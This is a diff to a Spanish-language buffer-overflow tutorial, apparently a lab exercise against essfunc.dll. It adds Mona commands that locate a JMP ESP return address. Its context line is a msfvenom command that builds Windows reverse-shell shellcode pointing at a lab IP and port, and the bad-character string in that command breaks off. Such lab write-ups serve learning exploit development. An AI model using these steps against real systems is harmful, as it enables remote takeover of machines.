@@ -607,6 +607,8 @@ Y efectivamente se fueron todos los badchars cuando dice Unmodified es cuando ya
 Pues ya teniendo los badchars y el offset solo es cuestion de crear la shellcode y modificar nuestros scripts.
 
 ```
+!mona modules
+!mona jmp -r ESP  -m "essfunc.dll"
 msfvenom -p windows/shell_reverse_tcp LHOST=192.168.230.128 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00
 
 ```
